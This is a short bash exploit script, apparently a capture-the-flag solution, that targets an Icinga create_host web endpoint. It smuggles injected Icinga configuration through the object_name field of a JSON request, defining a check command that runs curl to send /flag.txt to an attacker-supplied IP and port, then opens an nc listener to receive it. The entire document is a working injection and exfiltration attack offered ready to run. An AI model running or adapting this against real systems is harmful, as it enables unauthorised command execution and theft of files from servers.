[ $# -eq 4 ] || { printf "Usage: %s <host> <port> <listening_ip> <listening_port>\n" "$0"; exit 1; }
echo "Sending the request with the command injection to $1:$2..."

curl "http://$1:$2/icinga/create_host" \
	--header 'Content-Type: application/json' \
	--data '{ "object_name": "temp1\" { address = \"127.0.0.1\", check_command = \"hostalive\" }\nobject CheckCommand \"reverse\" { command = [ \"/usr/bin/curl\", \"--data-binary\", \"@/flag.txt\", \"'$3':'$4'\" ] }\nobject Host \"exploithost\" { check_command = \"reverse\", address = \"127.0.0.1\", check_interval = 1s }\nobject Host \"temp2", "check_command": "hostalive", "object_type": "Object" }'

printf "\n\n"
echo "Waiting and listening for the malicious "Host" object to perform a check..."
echo "Note: this might take a while, as check_interval = 1s does somehow not override the default 1m interval."
printf "\n\n"

nc -l 0.0.0.0 $4
